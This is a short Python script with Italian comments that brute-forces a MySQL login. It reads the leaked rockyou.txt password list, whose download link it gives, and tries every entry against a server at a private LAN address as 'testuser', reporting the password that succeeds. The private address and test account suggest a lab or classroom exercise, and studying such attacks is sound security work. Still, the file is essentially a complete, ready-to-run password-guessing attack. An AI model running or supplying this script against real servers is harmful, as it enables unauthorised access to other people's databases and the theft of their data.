#####################
# bruteforce_mysql.py
#####################
# script che tenta il login su un server mysql tentando un elenco di password
# usuali chiamato rockyou.txt reperibile al link
# https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
#####################

import mysql.connector

# aprire il file rockyou.txt
with open('rockyou.txt', 'rt', encoding='latin-1') as in_rockyou:
    rockyou_stringa = in_rockyou.read()

# caricare tutte le password in una lista
rockyou_lista = rockyou_stringa.split('\n')
print(len(rockyou_lista))
print(rockyou_lista[63721])
print(rockyou_lista.index('gatito'))
# per ogni password nella lista
for password in rockyou_lista:
    print(f"Provo la password {password}")
    try:
        mydb = mysql.connector.connect(host='192.168.1.119', username='testuser', db='test', password=password)
    except mysql.connector.errors.ProgrammingError:
        continue
    # sono qui se la password è corretta
    mydb.close()
    print(f"La password corretta è {password}")
    break



